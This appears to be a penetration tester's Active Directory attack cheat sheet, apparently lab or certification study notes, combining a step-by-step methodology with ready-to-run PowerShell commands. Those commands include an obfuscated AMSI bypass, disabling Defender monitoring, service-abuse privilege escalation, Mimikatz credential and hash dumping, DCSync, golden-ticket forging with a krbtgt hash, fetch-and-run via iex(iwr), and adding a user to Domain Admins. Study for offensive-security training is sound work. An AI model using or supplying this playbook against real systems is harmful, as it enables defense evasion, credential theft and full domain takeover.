# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all users
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---

# Command master

## 1. Bypass defender
```powershell
# AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Bypass real time monitoring ( admin privs )
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

## 2. Domain Enumeration
```powershell
# Users
Get-NetUser

# computers
Get-NetComputer

# domain admin
Get-NetDomain

# See Attributes of the Domain Admins Group
Get-NetGroup -GroupName "Domain Admins" -FullData

# Get Members of the Domain Admins group
Get-NetGroupMember -GroupName "Domain Admins"

# Forest
Get-NetDomainTrust
Get-NetForestDomain | Get-NetDomainTrust

# If bidirectional
Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

#Kerberoastable users
Get-NetUser -SPN 

# Bloodhound
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All,LoggedOn

# SQL
Import-Module .\PowerUpSQL.psd1
Get-SQLInstanceDomain
```

## 3. Domain Admin Priv Esc
**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**
```powershell
# Powerups
Invoke-Allchecks

# Abusing services
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student21'

# Run mimikatz
Invoke-Mimikatz
```

## 4. Domain Admin Priv Esc
```powershell
# Local admin user
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -CheckAccess -Verbose

# Enter session
$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
$sess
Enter-PSSession -Session $sess

# language mode
$ExecutionContext.SessionState.LanguageMode

# applocker 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Disable FireWall !!!

# Mimikatz
# Modify to make it work without dot sourcing
wget or curl or iex(iwr)
.\Invoke-Mimikatz.ps1
```

## 5. Domain Admin Persistence
```powershell
Invoke-Mimikatz

# note the rc4
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

## Extras 
```powershell
# Once you are DA add user to DA group
Invoke-Command -ScriptBlock {net group "DOMAIN ADMINS" student21 /domain /add} -ComputerName dcorp-dc.dollarcorp.moneycorp.local

C:> net localgroup Administrators student21 /add 
C:> net localgroup "Remote Desktop Users" student21 /add

https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

```

## Forest Priv Esc
```powershell

Invoke-Mimikatz

Invoke-Mimikatz -Command '"lsadump::trust /patch"'

Invoke-Mimikatz -Command '"lsadump::dcsync /domain:DOLLARCORP.MONEYCORP.LOCAL /all /csv"'

Invoke-Mimikatz -Command '"kerberos::golden /user:student21 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'

gwmi -Class win32_computersystem -ComputerName mcorp-dc.moneycorp.local


```


## Query
```powershell
net localgroup administrators
# add to localgroup admins
net localgroup Administrators student21 /add 

# add to RDP group
net localgroup "Remote Desktop Users" student21 /add

# Add to DA 
net group "DOMAIN ADMINS" student21 /domain /add

# Checking First Degree Object Controls
# if the user is part of a group example sql admins and has generic all access we can do the following
net group "SQLMANAGERS" examAd /domain /add
```